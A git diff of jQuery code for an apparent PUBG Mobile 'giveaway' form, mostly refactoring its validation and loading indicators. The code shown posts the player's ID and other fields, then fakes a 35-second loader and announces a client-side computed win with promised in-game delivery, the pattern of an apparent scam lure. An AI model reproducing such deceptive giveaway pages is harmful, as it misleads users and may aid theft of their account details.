@@ -141,13 +141,7 @@ $(document).ready(function () {
         }
 
         // check all are valid ?
-        let allClass = "";
-
-        $('#data :input.form-control').each(function () {
-            allClass += $(this).attr("class").split(/\s+/);
-        });
-
-        if (allClass.includes('is-invalid')) {
+        if ($('#data :input.form-control').hasClass('is-invalid')) {
             $('#tapatap').addClass('disabled');
         } else {
             $('#tapatap').removeClass('disabled');
@@ -156,19 +150,36 @@ $(document).ready(function () {
 
     $(document).ajaxStart(function () {
         $("#snackbar").addClass('show');
-        $("#data :input"). prop("disabled", true);
-        $('#tapatap').addClass('disabled');
+        $("#data :input").prop("disabled", true);
+
+        if ($('#tapatap').hasClass('disabled')) {
+            // do nothing
+        } else {
+            $('#tapatap').addClass('disabled');
+        }
     }).ajaxStop(function () {
-        $("#snackbar").removeClass('show');
+        if ($('#snackbar').hasClass('show')) {
+            $("#snackbar").removeClass('show');
+        }
     });
 
     $('.fa-sync').on('click', function () {
         captchaGen();
     });
 
+    // ON SUBMIT
     $('#tapatap').on('click', function (e) {
-        $('#tapatap').addClass('disabled');
-        $("#snackbar").addClass('show');
+        if ($('#tapatap').hasClass('disabled')) {
+            // do nothing
+        } else {
+            $('#tapatap').addClass('disabled');
+        }
+
+        if ($('#snackbar').hasClass('show')) {
+            // nothing
+        } else {
+            $("#snackbar").addClass('show');
+        }
 
         let igid = $('#igid').val(),
             ign = $('#ign').val(),
@@ -196,41 +207,37 @@ $(document).ready(function () {
                     data: JSON.stringify(payload),
                     dataType: "json",
                     contentType: "application/json",
-                    success: function (data, textStatus, xhr) {
-                        if (xhr.status == 200) {
+                    success: function () {
+                        if ($('#snackbar').hasClass('show')) {
                             $("#snackbar").removeClass('show');
-                            $('#data').get(0).reset();
-                            captchaGen();
-                            $('.participate-div').hide();
-                            // $('.circle-loader').show();
-                            $("body").css({ "background": "#000", "color": "#fff" });
-                            $("#term").show();
-
-                            let materials = winner(user, domain);
-                            $("#load-modal").modal({
-                                backdrop: 'static',
-                                keyboard: false,
-                            });
-
-                            $('#load-modal').modal('show');
-
-                            setTimeout(() => {
-                                $('.circle-loader').toggleClass('load-complete');
-                                $('.checkmark').toggle();
-                                $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
-                                drawMaterial(materials);
-                                $('.circle-loader').hide();
-                                $('#msg').html(
-                                    "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
-                                    "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
-                                );
-                                $('#load-modal .modal-footer').show();
-                            }, 35000);
-                        } else {
-                            console.log(`status: ${xhr.status}`);
-                            console.log(`text status: ${textStatus}`);
-                            console.log(data);
                         }
+                        $('#data').get(0).reset();
+                        captchaGen();
+                        $('.participate-div').hide();
+                        // $('.circle-loader').show();
+                        $("body").css({ "background": "#000", "color": "#fff" });
+                        $("#term").show();
+
+                        let materials = winner(user, domain);
+                        $("#load-modal").modal({
+                            backdrop: 'static',
+                            keyboard: false,
+                        });
+
+                        $('#load-modal').modal('show');
+
+                        setTimeout(() => {
+                            $('.circle-loader').toggleClass('load-complete');
+                            $('.checkmark').toggle();
+                            $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
+                            drawMaterial(materials);
+                            $('.circle-loader').hide();
+                            $('#msg').html(
+                                "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
+                                "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
+                            );
+                            $('#load-modal .modal-footer').show();
+                        }, 35000);
                     },
                     error: function (textStatus, errorThrown) {
                         $('#err-modal').modal('show');
